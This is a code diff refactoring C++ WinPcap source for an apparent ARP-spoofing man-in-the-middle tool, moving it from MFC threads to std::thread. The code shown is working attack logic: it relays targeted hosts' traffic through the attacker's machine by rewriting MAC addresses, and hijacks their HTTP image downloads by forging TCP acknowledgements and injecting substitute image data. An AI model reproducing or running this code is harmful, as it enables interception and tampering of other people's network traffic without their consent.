@@ -1,6 +1,8 @@
 #include "stdafx.h"
-#include "ARPTestDlg.h"
-#include "global.h"
+#include "MITM.h"
+#include <thread>
+#include "Helper.h"
+#include "Packet.h"
 
 
 volatile BOOL g_programRunning = TRUE;
@@ -19,54 +21,13 @@ std::map<MacAddress, HostInfoSetting*> g_attackListMac;
 CCriticalSection g_hostAttackListLock;
 
 
-BOOL inputIp(LPCSTR src, DWORD& dest)
+static void ReplaceImageThread(DWORD targetIp, WORD targetPort)
 {
-	DWORD ip[4];
-	if (sscanf_s(src, "%u.%u.%u.%u", &ip[0], &ip[1], &ip[2], &ip[3]) != 4)
-		return FALSE;
-	BYTE* bDest = (BYTE*)&dest;
-	bDest[0] = (BYTE)ip[0];
-	bDest[1] = (BYTE)ip[1];
-	bDest[2] = (BYTE)ip[2];
-	bDest[3] = (BYTE)ip[3];
-	return TRUE;
-}
-
-BOOL GetAdapterHandle(pcap_t*& adapter)
-{
-	if (g_adapter == nullptr)
-		return FALSE;
-	// open adapter
-	char errBuf[PCAP_ERRBUF_SIZE];
-	if ((adapter = pcap_open_live(g_adapter->name, 65536, 1, 1000, errBuf)) == nullptr)
-	{
-		AfxMessageBox("Error in pcap_open_live: " + CString(g_adapter->name) + " is not supported by WinPcap", MB_ICONERROR);
-		return FALSE;
-	}
-	return TRUE;
-}
-
-void SetFilter(pcap_t* adapter, LPCSTR exp)
-{
-	ULONG netmask = g_adapter->addresses == nullptr ? 0x00FFFFFF : ((sockaddr_in*)g_adapter->addresses->netmask)->sin_addr.S_un.S_addr;
-	bpf_program fcode;
-	pcap_compile(adapter, &fcode, exp, 1, netmask);
-	pcap_setfilter(adapter, &fcode);
-}
-
-/////////////////////////////////////////////////////////////////////////////////////////
-
-// param : { ip, port }
-static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
-{
-	pcap_t* adapter;
-	if (!GetAdapterHandle(adapter))
-		return 0;
+	AdapterHandle adapter(GetAdapterHandle());
+	if (adapter == nullptr)
+		return;
 
 	// get infomation
-	DWORD targetIp = ((DWORD*)param)[0];
-	WORD targetPort = (WORD)((DWORD*)param)[1];
-	delete param;
 	g_hostAttackListLock.Lock();
 	HostInfoSetting& target = g_host[targetIp];
 	g_hostAttackListLock.Unlock();
@@ -101,18 +62,18 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 	pPktTcp->ack = htonl(ntohl(pInitTcp->seq) + (link.initPacketLen - ETH_LENGTH - ipLen - tcpLen));
 	pPktTcp->psh = 0;
 	pPktTcp->CalcCheckSum(pPktIp->sourceIp, pPktIp->destinationIp, (WORD)tcpLen);
-	pcap_sendpacket(adapter, (u_char*)ackPkt.get(), ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));
+	pcap_sendpacket(adapter.get(), (u_char*)ackPkt.get(), ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));
 
 	CString exp;
 	BYTE* bIp = (BYTE*)&target.ip;
 	exp.Format("ip host %u.%u.%u.%u and tcp dst port %u", bIp[0], bIp[1], bIp[2], bIp[3], ntohs(targetPort));
-	SetFilter(adapter, exp);
+	SetFilter(adapter.get(), exp);
 	DWORD time = GetTickCount();
 	pcap_pkthdr* header;
 	const BYTE* pkt_data;
 	int res;
 	DWORD lastAck = ntohl(pPktTcp->ack);
-	while ((res = pcap_next_ex(adapter, &header, &pkt_data)) >= 0 && GetTickCount() - time < 5000)
+	while ((res = pcap_next_ex(adapter.get(), &header, &pkt_data)) >= 0 && GetTickCount() - time < 5000)
 	{
 		if (res == 0) // timeout
 			continue;
@@ -128,7 +89,7 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 			lastAck = ack;
 		pPktTcp->ack = htonl(lastAck);
 		pPktTcp->CalcCheckSum(pPktIp->sourceIp, pPktIp->destinationIp, (WORD)tcpLen);
-		pcap_sendpacket(adapter, (u_char*)ackPkt.get(), ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));
+		pcap_sendpacket(adapter.get(), (u_char*)ackPkt.get(), ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));
 		if (pCurTcp->psh)
 			break;
 	}
@@ -203,7 +164,7 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 	pTcp->psh = 0;
 	pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, p1 - (BYTE*)pTcp); // TCP checksum
 
-	pcap_sendpacket(adapter, (u_char*)sendBuf.get(), totalLen);
+	pcap_sendpacket(adapter.get(), (u_char*)sendBuf.get(), totalLen);
 	pTcp->seq = htonl(ntohl(pTcp->seq) + (totalLen - ETH_LENGTH - ipLen - tcpLen));
 	///////////////////////////////////////////////////////////////////////////////////
 #pragma endregion
@@ -226,7 +187,7 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 		memcpy(pTcpData, &target.imageData[start], maxTcpDataLen);
 		target.imageDataLock.Unlock();
 		pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, (WORD)(tcpLen + maxTcpDataLen)); // TCP checksum
-		pcap_sendpacket(adapter, (u_char*)sendBuf.get(), sendBufLen);
+		pcap_sendpacket(adapter.get(), (u_char*)sendBuf.get(), sendBufLen);
 		pTcp->seq = htonl(ntohl(pTcp->seq) + maxTcpDataLen);
 	}
 
@@ -245,46 +206,43 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 	pTcp->psh = 1;
 	pTcp->fin = 1;
 	pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, (WORD)(tcpLen + lastTcpDataLen)); // TCP checksum
-	pcap_sendpacket(adapter, (u_char*)sendBuf.get(), ETH_LENGTH + ntohs(pIp->totalLen));
+	pcap_sendpacket(adapter.get(), (u_char*)sendBuf.get(), ETH_LENGTH + ntohs(pIp->totalLen));
 	///////////////////////////////////////////////////////////////////////////////////
 
 
 	///////////////////////////////////////////////////////////////////////////////////
 	// release
 End:
-	pcap_close(adapter);
 	target.httpImageLinkLock.Lock();
 	target.httpImageLink.erase(targetPort);
 	target.httpImageLinkLock.Unlock();
-	return 0;
 }
 
-UINT AFX_CDECL PacketHandleThread(LPVOID _thiz)
+void PacketHandleThread()
 {
-	CARPTestDlg* thiz = (CARPTestDlg*)_thiz;
-	pcap_t* adapter;
-	if (!GetAdapterHandle(adapter))
-		return 0;
+	AdapterHandle adapter(GetAdapterHandle());
+	if (adapter == nullptr)
+		return;
 
 	// start capture
 	CString exp;
 	BYTE* bIp = (BYTE*)&g_selfIp;
 	exp.Format("not host %u.%u.%u.%u", bIp[0], bIp[1], bIp[2], bIp[3]);
-	SetFilter(adapter, exp);
+	SetFilter(adapter.get(), exp);
 	pcap_pkthdr* header;
 	const BYTE* pkt_data;
 	int res;
-	while (g_attacking && (res = pcap_next_ex(adapter, &header, &pkt_data)) >= 0)
+	while (g_attacking && (res = pcap_next_ex(adapter.get(), &header, &pkt_data)) >= 0)
 	{
 		if (res == 0) // timeout
 			continue;
 
+#pragma region Target Packet
 		{
 		g_hostAttackListLock.Lock();
 		auto targetIt = g_attackListMac.find(*(MacAddress*)(pkt_data + 6));
 		g_hostAttackListLock.Unlock();
 		if (targetIt != g_attackListMac.end()) // is target packet
-#pragma region
 		{
 			HostInfoSetting& target = *targetIt->second;
 			target.send++;
@@ -309,16 +267,16 @@ UINT AFX_CDECL PacketHandleThread(LPVOID _thiz)
 				*(MacAddress*)newData.get() = g_gatewayMac; // destination MAC
 				*(MacAddress*)(newData.get() + 6) = g_selfMac; // source MAC
 				memcpy(newData.get() + 12, pkt_data + 12, header->len - 12); // data
-				pcap_sendpacket(adapter, (u_char*)newData.get(), header->len);
+				pcap_sendpacket(adapter.get(), (u_char*)newData.get(), header->len);
 			}
 			continue;
 		}
+		} // target packet end
 #pragma endregion
-		}
 
+#pragma region Gateway Packet
 		if (*(MacAddress*)(pkt_data + 6) == g_gatewayMac // is gateway packet
 			&& *(WORD*)&pkt_data[12] == PROTOCOL_IP) // IP
-#pragma region
 		{
 			IPPacket* pIp = (IPPacket*)&pkt_data[ETH_LENGTH];
 			g_hostAttackListLock.Lock();
@@ -366,10 +324,8 @@ UINT AFX_CDECL PacketHandleThread(LPVOID _thiz)
 			link.initPacketLen = header->len;
 			link.initPacket.reset(new BYTE[header->len]);
 			memcpy(link.initPacket.get(), pkt_data, header->len);
-			DWORD* param = new DWORD[2];
-			param[0] = target.ip;
-			param[1] = pTcp->destinationPort;
-			AfxBeginThread(ReplaceImageThread, (LPVOID)param);
+			std::thread thread(ReplaceImageThread, target.ip, pTcp->destinationPort);
+			thread.detach();
 			continue;
 			
 Forward:
@@ -379,14 +335,9 @@ Forward:
 				*(MacAddress*)newData.get() = target.mac; // destination MAC
 				*(MacAddress*)(newData.get() + 6) = g_selfMac; // source MAC
 				memcpy(newData.get() + 12, pkt_data + 12, header->len - 12); // data
-				pcap_sendpacket(adapter, (u_char*)newData.get(), header->len);
+				pcap_sendpacket(adapter.get(), (u_char*)newData.get(), header->len);
 			}
-			continue;
-		}
+		} // gateway packet end
 #pragma endregion
-	}
-
-	// release
-	pcap_close(adapter);
-	return 0;
+	} // capture end
 }
